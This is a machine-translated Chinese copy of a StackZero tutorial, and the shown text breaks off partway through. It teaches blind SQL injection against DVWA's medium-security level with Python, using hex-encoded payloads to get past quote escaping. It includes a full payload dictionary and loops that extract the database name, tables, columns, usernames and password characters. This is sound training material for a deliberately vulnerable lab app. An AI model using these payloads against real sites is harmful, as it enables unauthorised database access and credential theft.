<html>
<head>
<title>Burp Suite? No Thanks! Blind SQLi in DVWA With Python (Part 2) — StackZero</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">打嗝组曲？不用了，谢谢！用Python实现DVWA中的盲SQLi(第2部分)— StackZero</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/burp-suite-no-thanks-blind-sqli-in-dvwa-with-python-part-2-stackzero-a5c0acf431dc?source=collection_archive---------2-----------------------#2022-10-26">https://infosecwriteups.com/burp-suite-no-thanks-blind-sqli-in-dvwa-with-python-part-2-stackzero-a5c0acf431dc?source=collection_archive---------2-----------------------#2022-10-26</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><figure class="gl gn jr js jt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi jq"><img src="../Images/838746927bd31dea2e12625cacad8c23.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*iSxJgJubrnOwSZZxUsFiBg.jpeg"/></div></div></figure><blockquote class="kb kc kd"><p id="bef6" class="ke kf kg kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">本文原载于<a class="ae ld" href="https://www.stackzero.net/blind-sql-injection-dvwa-medium-python/" rel="noopener ugc nofollow" target="_blank">https://www . stack zero . net/blind-SQL-injection-dvwa-medium-python/</a></p></blockquote><p id="c2db" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">嗨黑客们！在用一个盲目的SQL注入攻击完成了低安全性<a class="ae ld" href="https://github.com/digininja/DVWA" rel="noopener ugc nofollow" target="_blank"> DVWA </a>之后，是时候使用Python来尝试中等级别的安全性了！<br/>我假设你已经在<a class="ae ld" rel="noopener ugc nofollow" target="_blank" href="/how-i-exploited-blind-sqli-without-using-any-tool-stackzero-396e831ecbdf">阅读了之前的帖子，点击</a>链接，这样我们就可以专注于新的概念。</p><p id="0a4b" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">如果你对SQL注入不熟悉，这里有一个我以前所有文章的列表，可以让你成为一个SQLi忍者！</p><h1 id="e253" class="lh li it bd lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">带内SQL注入</h1><ul class=""><li id="8e09" class="mf mg it kh b ki mh km mi le mj lf mk lg ml lc mm mn mo mp bi translated"><a class="ae ld" href="https://medium.com/codex/sql-injection-what-you-need-to-know-stackzero-abc80bc1ea5e" rel="noopener"> SQL注入:您需要了解的内容</a></li><li id="6ef8" class="mf mg it kh b ki mq km mr le ms lf mt lg mu lc mm mn mo mp bi translated"><a class="ae ld" href="https://medium.com/bugbountywriteup/learn-sql-injection-in-practice-by-hacking-vulnerable-application-stackzero-ef7931c72aec" rel="noopener">通过黑客攻击易受攻击的应用程序，在实践中学习SQL注入！</a></li><li id="9f26" class="mf mg it kh b ki mq km mr le ms lf mt lg mu lc mm mn mo mp bi translated"><a class="ae ld" href="https://medium.com/bugbountywriteup/how-to-hack-with-sql-injection-attacks-dvwa-low-security-stackzero-9286d7d0dfd1" rel="noopener">如何用SQL注入攻击进行黑客攻击！DVWA低安全性</a></li><li id="169e" class="mf mg it kh b ki mq km mr le ms lf mt lg mu lc mm mn mo mp bi translated"><a class="ae ld" rel="noopener ugc nofollow" target="_blank" href="/hack-with-sql-injection-attacks-dvwa-medium-security-stackzero-d4af0a9a5f9">黑客用SQL注入攻击！DVWA中等安全性</a></li><li id="afc9" class="mf mg it kh b ki mq km mr le ms lf mt lg mu lc mm mn mo mp bi translated"><a class="ae ld" rel="noopener ugc nofollow" target="_blank" href="/hack-with-sql-injection-attacks-dvwa-high-security-stackzero-713638840515">黑客用SQL注入攻击！DVWA高安全性</a></li></ul><h1 id="6e6a" class="lh li it bd lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">盲人SQL注入</h1><ul class=""><li id="d2bf" class="mf mg it kh b ki mh km mi le mj lf mk lg ml lc mm mn mo mp bi translated"><a class="ae ld" rel="noopener ugc nofollow" target="_blank" href="/how-i-exploited-blind-sqli-without-using-any-tool-stackzero-396e831ecbdf">打嗝组曲？不用了，谢谢！用Python实现DVWA中的盲SQLi(第1部分)</a></li><li id="6229" class="mf mg it kh b ki mq km mr le ms lf mt lg mu lc mm mn mo mp bi translated"><a class="ae ld" rel="noopener ugc nofollow" target="_blank" href="/burp-suite-no-thanks-blind-sqli-in-dvwa-with-python-part-2-stackzero-a5c0acf431dc">打嗝组曲？不用了，谢谢！用Python实现DVWA中的盲SQLi(第2部分)</a></li><li id="4eb6" class="mf mg it kh b ki mq km mr le ms lf mt lg mu lc mm mn mo mp bi translated"><a class="ae ld" rel="noopener ugc nofollow" target="_blank" href="/burp-suite-no-thanks-blind-sqli-in-dvwa-with-python-part-3-stackzero-911545003f01">打嗝组曲？不用了，谢谢！用Python实现DVWA中的盲SQLi(第3部分)</a></li></ul><p id="a3c7" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">因此，我们的起点将是我们用来利用低安全级别的<a class="ae ld" href="https://github.com/digininja/DVWA" rel="noopener ugc nofollow" target="_blank"> DVWA </a>的python脚本，从这一点出发，我们将做一些小的更改来面对中等难度。</p><p id="5941" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">你应该已经知道我很懒，所以这次我不会再配置我自己的机器，但我将使用在<a class="ae ld" href="https://tryhackme.com/room/dvwa" rel="noopener ugc nofollow" target="_blank"> TryHackMe </a>预配置的机器。</p><p id="92b7" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">您可以在本文中找到配置步骤的简要说明:</p><p id="8d25" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">但是现在让我们开始真正的挑战吧！</p><h1 id="e59d" class="lh li it bd lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">先决条件</h1><p id="1a6b" class="pw-post-body-paragraph ke kf it kh b ki mh kk kl km mi ko kp le mv ks kt lf mw kw kx lg mx la lb lc im bi translated">您可能已经知道，我试图构建一个小库，让您只关注盲目的SQL注入攻击(忽略登录部分和CSRF令牌管理)，所以在遵循教程之前，请从GitHub存储库中获取“utils.py”文件(在<a class="ae ld" href="https://github.com/StackZeroSec/dvwa/tree/main/blind_sqli" rel="noopener ugc nofollow" target="_blank">这个链接</a>(如果您喜欢复制粘贴，也可以在最后找到完整的代码)。</p><p id="0c54" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">之后，您应该安装以下库:</p><p id="74ed" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">您可以在终端上键入以下命令:</p><pre class="my mz na nb gt nc nd ne nf aw ng bi"><span id="47c1" class="nh li it nd b gy ni nj l nk nl">pip install beautifulsoup4 requests</span></pre><p id="1b6c" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">没有更多的事要做，你准备开始！</p><h1 id="aafa" class="lh li it bd lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">第0步:与低安全性DVWA的区别</h1><p id="23ea" class="pw-post-body-paragraph ke kf it kh b ki mh kk kl km mi ko kp le mv ks kt lf mw kw kx lg mx la lb lc im bi translated">如果你已经阅读了<a class="ae ld" rel="noopener ugc nofollow" target="_blank" href="/how-i-exploited-blind-sqli-without-using-any-tool-stackzero-396e831ecbdf">上一篇文章</a>，这可能是最重要的部分。</p><p id="b83f" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">我们希望在将安全级别设置为<em class="kg">“中”</em>之后，使用python对DVWA进行盲SQL注入攻击。我们已经完成了大部分工作，所以我们可以只关注低安全性和中等安全性之间的差异。</p><p id="0ef1" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">只有两个主要的区别会使我们改变我们以前采取的方法。</p><p id="1958" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">从这篇文章中我们应该知道<a class="ae ld" href="https://www.php.net/manual/en/function.mysql-real-escape-string.php" rel="noopener ugc nofollow" target="_blank">Mysql _ real _ escape _ string</a>不足以阻止SQL注入攻击，不管它是什么类型。正如文档中所说:</p><p id="84b6" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated"><strong class="kh iu"><em class="kg">mysql _ real _ escape _ string()</em></strong><em class="kg">调用MySQL的库函数mysql_real_escape_string，其中将反斜杠前置到以下字符:</em> <code class="fe nm nn no nd b"><em class="kg">\x00</em></code> <em class="kg">、</em> <code class="fe nm nn no nd b"><em class="kg">\n</em></code> <em class="kg">、</em> <code class="fe nm nn no nd b"><em class="kg">\r</em></code> <em class="kg">、</em> <code class="fe nm nn no nd b"><em class="kg">\</em></code> <em class="kg">、</em> <code class="fe nm nn no nd b"><em class="kg">'</em></code> <em class="kg">、</em> <code class="fe nm nn no nd b"><em class="kg">"</em></code> <em class="kg">和</em> <code class="fe nm nn no nd b"><em class="kg">\x1a</em></code> <em class="kg">。</em></p><p id="d727" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated"><strong class="kh iu">那么如果我们可以使用python执行一个盲SQL注入攻击，而不使用DVWA中等安全上的那些字符呢？</strong></p><p id="735d" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">现在的问题是:</p><p id="c0f7" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">我们如何在盲SQL注入python脚本中使用字符串而不使用单引号/双引号？</p><p id="9479" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">MySQL文档可以帮助我们理解十六进制文字<a class="ae ld" href="https://dev.mysql.com/doc/refman/8.0/en/hexadecimal-literals.html" rel="noopener ugc nofollow" target="_blank">的概念</a>，它可以让我们通过使用十六进制值插入一个字符串，而不用引号。</p><h1 id="2009" class="lh li it bd lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">如何在python中将一个字符串转换成它的十六进制文字值？</h1><p id="d85a" class="pw-post-body-paragraph ke kf it kh b ki mh kk kl km mi ko kp le mv ks kt lf mw kw kx lg mx la lb lc im bi translated">在python中我们可以用非常简单的方式将一个字符串转换成它的<a class="ae ld" href="https://dev.mysql.com/doc/refman/8.0/en/hexadecimal-literals.html" rel="noopener ugc nofollow" target="_blank">十六进制文字值</a>，我们需要用<em class="kg"> encode </em>对函数进行编码，然后用<em class="kg"> hex </em>函数进行转换。</p><p id="6040" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">但是为了在查询中使用十六进制版本，我们需要在结果前面加上<em class="kg">“0x”</em>字符串。</p><p id="7146" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">因此，为了使一切更具可读性，让我们定义将转换python脚本中每个字符串的函数。</p><pre class="my mz na nb gt nc nd ne nf aw ng bi"><span id="bfe9" class="nh li it nd b gy ni nj l nk nl">def get_hex_str(string):<br/>    return f'0x{string.encode("utf-8").hex()}'</span></pre><h1 id="07c8" class="lh li it bd lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">用POST (HTTP)更改GET (HTTP)方法</h1><p id="6871" class="pw-post-body-paragraph ke kf it kh b ki mh kk kl km mi ko kp le mv ks kt lf mw kw kx lg mx la lb lc im bi translated">至此，我们已经解决了<a class="ae ld" href="https://www.php.net/manual/en/function.mysql-real-escape-string.php" rel="noopener ugc nofollow" target="_blank">MySQL _ real _ escape _ string</a>函数的问题。<br/>但是如果以我们进入<a class="ae ld" rel="noopener ugc nofollow" target="_blank" href="/how-i-exploited-blind-sqli-without-using-any-tool-stackzero-396e831ecbdf">低难度等级</a>所用的python脚本为出发点，我们就不得不考虑要把HTTP方法改成<a class="ae ld" href="https://en.wikipedia.org/wiki/POST_(HTTP)" rel="noopener ugc nofollow" target="_blank"> POST </a>。</p><p id="d43f" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">由于我们之前所做的选择，我们可以通过修改<em class="kg"> get_query_result </em>函数中的几行代码来实现目标。</p><p id="7a1c" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">让我们看看新功能:</p><pre class="my mz na nb gt nc nd ne nf aw ng bi"><span id="67f9" class="nh li it nd b gy ni nj l nk nl">def get_query_result(s, sqli_blind_url, query, *args):<br/>    try:<br/>        concrete_query = query.format(*args)<br/>        data = {<br/>            "id": concrete_query,<br/>            "Submit": "Submit"<br/>        }<br/>        response = s.post(sqli_blind_url, data=data)<br/>        parser = DVWASQLiResponseParser(response)<br/>        return parser.check_presence("exist")<br/>    except AttributeError as e:<br/>        return False</span></pre><p id="3ef6" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">不是比你想象的简单吗？</p><p id="bc78" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">现在，我们可以一步一步地看到我们可以做的一些小改变，以使脚本工作，并利用我们的<a class="ae ld" href="https://github.com/digininja/DVWA" rel="noopener ugc nofollow" target="_blank"> DVWA </a>机器中的盲SQL部分。</p><h1 id="3347" class="lh li it bd lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">查询词典</h1><p id="da09" class="pw-post-body-paragraph ke kf it kh b ki mh kk kl km mi ko kp le mv ks kt lf mw kw kx lg mx la lb lc im bi translated">我想对代码进行排序，让所有重要的工作一目了然，因此与之前的脚本不同，这一次我将所有有效负载分组到一个全局字典中。</p><pre class="my mz na nb gt nc nd ne nf aw ng bi"><span id="7260" class="nh li it nd b gy ni nj l nk nl">queries = {<br/>    "db_length": "1 AND LENGTH(DATABASE()) = {} #",<br/>    "db_name": "1 AND SUBSTRING(DATABASE(), {}, 1) = {}",<br/>    "n_tables": "1 AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema={})={} #",<br/>    "tables": "1 AND SUBSTR((SELECT table_name from information_schema.tables WHERE table_schema={} {} LIMIT 1),{},1)={} #",<br/>    "n_columns": "1 AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name={})={} #",<br/>    "columns": "1 AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name={} LIMIT {}, 1),{},1)={} #",<br/>    "users": "1 AND SUBSTR((SELECT {} FROM {} LIMIT {}, 1),{},1)={} #",<br/>    "pwd_len": "1 AND LENGTH((SELECT {} FROM {} WHERE {}={}))={} #",<br/>    "pwd": "1 AND SUBSTR((SELECT {} FROM {} WHERE {}={} LIMIT 1), {}, 1)={} #"<br/>}</span></pre><h1 id="7262" class="lh li it bd lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">步骤1:获取数据库信息</h1><p id="3807" class="pw-post-body-paragraph ke kf it kh b ki mh kk kl km mi ko kp le mv ks kt lf mw kw kx lg mx la lb lc im bi translated">在黑盒攻击的情况下，第一步是获取关于数据库的信息。在这种情况下，我会假设我们已经知道MySQL是目标DBMS(我在以前的文章中通过使用<a class="ae ld" href="https://dev.mysql.com/doc/refman/8.0/en/information-functions.html#function_version" rel="noopener ugc nofollow" target="_blank"> MySQL Version函数</a>展示了如何知道这一点)。</p><p id="67bf" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">用python对中等安全级别的<a class="ae ld" href="https://github.com/digininja/DVWA" rel="noopener ugc nofollow" target="_blank"> DVWA </a>进行盲SQL注入攻击的想法与我们已经看到的并没有太大的不同。<br/>我们必须使用长度函数，并通过与合理范围的值进行比较来测试它。<br/>有效载荷将是(记住花括号是一个占位符，我们将在代码中替换它):</p><pre class="my mz na nb gt nc nd ne nf aw ng bi"><span id="cee9" class="nh li it nd b gy ni nj l nk nl">1 AND LENGTH(DATABASE()) = {} #</span></pre><p id="a933" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">之后，我们知道了数据库名称的长度，我们可以测试所有子字符串，记住我们不能使用引号，所以值必须转换成十六进制值。</p><p id="3ee4" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">由于有了<a class="ae ld" href="https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_substring" rel="noopener ugc nofollow" target="_blank">子串</a>函数，这个有效负载将让我们检索数据库的名称:</p><pre class="my mz na nb gt nc nd ne nf aw ng bi"><span id="e7ce" class="nh li it nd b gy ni nj l nk nl">1 AND SUBSTRING(DATABASE(), {}, 1) = {}</span></pre><p id="636e" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">我们已经看到了如何运行有效载荷并得到结果，但是一个回顾不会伤害我们！</p><pre class="my mz na nb gt nc nd ne nf aw ng bi"><span id="b999" class="nh li it nd b gy ni nj l nk nl">query = queries["db_length"]<br/>length = 0<br/>for i in range(1,10):<br/>    if get_query_result(s, sqli_blind_url, query, i):<br/>        print(f"[+] The DB's name length is {i}")<br/>        length = i<br/>        break</span><span id="1ef2" class="nh li it nd b gy np nj l nk nl">query = queries["db_name"]<br/>dbname = []</span><span id="48d6" class="nh li it nd b gy np nj l nk nl">for i in range(1, length+1):<br/>    for c in string.ascii_lowercase:<br/>        if get_query_result(s, sqli_blind_url, query, i, get_hex_str(c)):<br/>            dbname.append(c)<br/>            break<br/>dbname = "".join(dbname)<br/>print(f'[+] Found a database with name: {dbname}')</span></pre><h1 id="e84b" class="lh li it bd lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">步骤2:获取表格信息</h1><p id="cfe1" class="pw-post-body-paragraph ke kf it kh b ki mh kk kl km mi ko kp le mv ks kt lf mw kw kx lg mx la lb lc im bi translated">一个好的黑客将执行的下一步是检索表的信息，特别是，我们想知道:</p><ul class=""><li id="640a" class="mf mg it kh b ki kj km kn le nq lf nr lg ns lc mm mn mo mp bi translated">数字</li><li id="66fc" class="mf mg it kh b ki mq km mr le ms lf mt lg mu lc mm mn mo mp bi translated">名称</li></ul><p id="7b5a" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">获得数字与获得数据库名称的长度没有太大区别，这一次我们需要对它们进行计数，并将它们与一系列合理的数字进行比较(您可以对什么是“合理的”做出假设！)，对于我们的示例，我选择了1到10之间的范围。</p><p id="c1b4" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">为此，我们将查询<em class="kg">information _ schema . tables</em>元表，并使用<a class="ae ld" href="https://dev.mysql.com/doc/refman/8.0/en/aggregate-functions.html#function_count" rel="noopener ugc nofollow" target="_blank"> COUNT </a>函数</p><p id="6324" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">这是产生的有效载荷:</p><pre class="my mz na nb gt nc nd ne nf aw ng bi"><span id="ade9" class="nh li it nd b gy ni nj l nk nl">1 AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema={})={} #</span></pre><p id="bed0" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">“WHERE”子句需要一个字符串，所以我们必须注意用它的十六进制值替换占位符，python中是这样的:</p><pre class="my mz na nb gt nc nd ne nf aw ng bi"><span id="4ef7" class="nh li it nd b gy ni nj l nk nl">query = queries["n_tables"]<br/>n_tables = 0<br/>for i in range(1, 10):<br/>    if get_query_result(s, sqli_blind_url, query, get_hex_str(dbname), i):<br/>        print(f"[+] It has {i} tables")<br/>        n_tables = i<br/>        break</span></pre><p id="9d5a" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">现在我们知道了表的数量，下一步是列出它们，此时我们会遇到两个主要问题:</p><ul class=""><li id="91fe" class="mf mg it kh b ki kj km kn le nq lf nr lg ns lc mm mn mo mp bi translated">盲人SQL注入一次只能测试一个名字。</li><li id="5110" class="mf mg it kh b ki mq km mr le ms lf mt lg mu lc mm mn mo mp bi translated">枚举许多表可能需要很多时间。</li></ul><p id="f506" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">我们解决第一个问题的方法是在WHERE子句中附加一个不等于链，以排除我们已经找到的表(在下一段中，我们将看到另一种使用LIMIT子句的技术)。</p><p id="0341" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">我们将通过允许用户在找到正确的表时提前停止扫描来部分解决第二个问题。</p><p id="fbf5" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">这是代码:</p><pre class="my mz na nb gt nc nd ne nf aw ng bi"><span id="218d" class="nh li it nd b gy ni nj l nk nl">query = queries["tables"]</span><span id="c2e9" class="nh li it nd b gy np nj l nk nl">found_tables = [[] for _ in range(n_tables)]<br/>completion = ""<br/>for i in range(n_tables):        <br/>    for j in range(1, 10):<br/>        for c in string.ascii_lowercase:<br/>            if get_query_result(s, sqli_blind_url, query, get_hex_str(dbname), completion, j, get_hex_str(c)):<br/>                found_tables[i].append(c)<br/>                break<br/>    print("\t","".join(found_tables[i]))<br/>    completion += f" AND table_name &lt;&gt; {get_hex_str(''.join(found_tables[i]))}"</span></pre><h1 id="c8e5" class="lh li it bd lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">步骤3:获取表格信息</h1><p id="0748" class="pw-post-body-paragraph ke kf it kh b ki mh kk kl km mi ko kp le mv ks kt lf mw kw kx lg mx la lb lc im bi translated">文章背后的想法是构建一个一体化的脚本，那么，脚本如何知道什么是目标表呢？</p><p id="6925" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">快速反应是:<strong class="kh iu">不能！</strong></p><p id="b801" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">因此，不需要做任何事情，我们可以接受用户输入:</p><pre class="my mz na nb gt nc nd ne nf aw ng bi"><span id="e4d6" class="nh li it nd b gy ni nj l nk nl">users_table = input("Type the tabname to attack: ")</span></pre><p id="49df" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">之后，我们在WHERE子句中插入一个字符串(记住，您可以只插入它的十六进制值)并获得我们需要的信息:</p><ul class=""><li id="03df" class="mf mg it kh b ki kj km kn le nq lf nr lg ns lc mm mn mo mp bi translated">列数</li><li id="0bf1" class="mf mg it kh b ki mq km mr le ms lf mt lg mu lc mm mn mo mp bi translated">列的名称</li></ul><p id="dac6" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">有效负载与我们看到的枚举表的有效负载没有太大的不同。<br/>在这种情况下，也可以通过使用<a class="ae ld" href="https://dev.mysql.com/doc/refman/8.0/en/aggregate-functions.html#function_count" rel="noopener ugc nofollow" target="_blank">计数</a>并将结果与一系列数字(本例中为1-10)进行比较来获得列数。</p><p id="f546" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">这是将返回我们需要的信息的有效载荷:</p><pre class="my mz na nb gt nc nd ne nf aw ng bi"><span id="c729" class="nh li it nd b gy ni nj l nk nl">1 AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name={})={} #</span></pre><p id="7291" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">这是将使用这个有效负载的代码！</p><pre class="my mz na nb gt nc nd ne nf aw ng bi"><span id="ffd1" class="nh li it nd b gy ni nj l nk nl">query = queries["n_columns"]</span><span id="6478" class="nh li it nd b gy np nj l nk nl">n_columns = 0<br/>for i in range(1, 10):<br/>    if get_query_result(s, sqli_blind_url, query, get_hex_str(users_table), i):<br/>        print(f"[+] It has {i} columns")<br/>        n_columns = i<br/>        break</span></pre><p id="8769" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">给定这些信息，我们可以通过使用这个有效负载来获得我们正在寻找的所有选项卡名称:</p><pre class="my mz na nb gt nc nd ne nf aw ng bi"><span id="2ac0" class="nh li it nd b gy ni nj l nk nl">1 AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name={} LIMIT {}, 1),{},1)={} #</span></pre><p id="1610" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">在本例中，我们列出了所有的表。<br/>想法是一个接一个地获取表，这一次是通过使用LIMIT子句来完成的，该子句将<strong class="kh iu"> row_count </strong>作为第一个参数，将<strong class="kh iu"> index </strong>作为第二个参数。</p><p id="f265" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">代码对你来说并不陌生:</p><h1 id="b9c7" class="lh li it bd lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">步骤4:获取用户信息</h1><p id="9c60" class="pw-post-body-paragraph ke kf it kh b ki mh kk kl km mi ko kp le mv ks kt lf mw kw kx lg mx la lb lc im bi translated">现在我们想要获得用户名和密码，为此我们必须指出我们需要告诉脚本哪些列与这些字段相关。</p><p id="88ba" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">同样在这种情况下，我们将询问用户目标列的名称:</p><pre class="my mz na nb gt nc nd ne nf aw ng bi"><span id="96f0" class="nh li it nd b gy ni nj l nk nl">users_column = input("Type the name of the column containing usernames: ")<br/>passwords_column = input("Type the name of the column containing passwords: ")</span></pre><p id="a7c8" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">给定这些输入，我们可以列出用户，即使在这种情况下，用户可以停止扫描。</p><p id="8c0c" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">细心的观察者会注意到，这次脚本不会计算用户数量。<br/>但是我更喜欢使用一个合理的值，因为我知道我们会更快地停止扫描。</p><p id="30d7" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">允许我们这样做的有效载荷如下:</p><pre class="my mz na nb gt nc nd ne nf aw ng bi"><span id="d3ed" class="nh li it nd b gy ni nj l nk nl">1 AND SUBSTR((SELECT {} FROM {} LIMIT {}, 1),{},1)={} #</span></pre><h1 id="918d" class="lh li it bd lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">步骤5:获取密码</h1><p id="c8d3" class="pw-post-body-paragraph ke kf it kh b ki mh kk kl km mi ko kp le mv ks kt lf mw kw kx lg mx la lb lc im bi translated">最后，我们处于python脚本的末尾，该脚本将允许我们对具有中等安全级别的DVWA执行盲SQL注入攻击。</p><p id="69b5" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">选择目标用户对于持续攻击至关重要，我们将再次询问用户:</p><pre class="my mz na nb gt nc nd ne nf aw ng bi"><span id="5ee3" class="nh li it nd b gy ni nj l nk nl">username = input("Type the name of the target user: ")</span></pre><p id="85bb" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">现在我们有了完成攻击所需的所有信息，我们只是缺少两条信息，您可能会想到是哪条:</p><ul class=""><li id="1d3f" class="mf mg it kh b ki kj km kn le nq lf nr lg ns lc mm mn mo mp bi translated">密码的长度</li><li id="b7ca" class="mf mg it kh b ki mq km mr le ms lf mt lg 